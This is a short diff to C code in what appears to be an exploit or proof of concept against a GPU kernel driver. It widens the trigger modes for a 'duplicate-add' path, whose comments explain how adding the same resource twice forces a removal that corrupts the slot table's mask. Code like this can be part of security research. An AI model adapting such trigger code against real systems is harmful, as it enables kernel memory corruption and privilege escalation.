@@ -469,7 +469,7 @@ void nk_iogpu_group_oob_run(int trigger)
     }
 
 
-    if (trigger == 4) {
+    if (trigger == 0 || trigger == 4) {
         /* DUPLICATE ADD = THE REMOVE PATH.
          *
          * The slot table's mask lives at +0x30 and is decremented on every
@@ -483,7 +483,7 @@ void nk_iogpu_group_oob_run(int trigger)
          * adding the SAME resource twice forces the insert path to drop the
          * old entry first, and that drop is the removal.
          */
-        ol("[grp] === DUPLICATE-ADD TRIGGER ===");
+        ol("[grp] === DUPLICATE-ADD TRIGGER (mode=%d) ===", trigger);
         static uint8_t o4[0x200];
         size_t on4 = 0;
         int k4 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, o4, &on4);
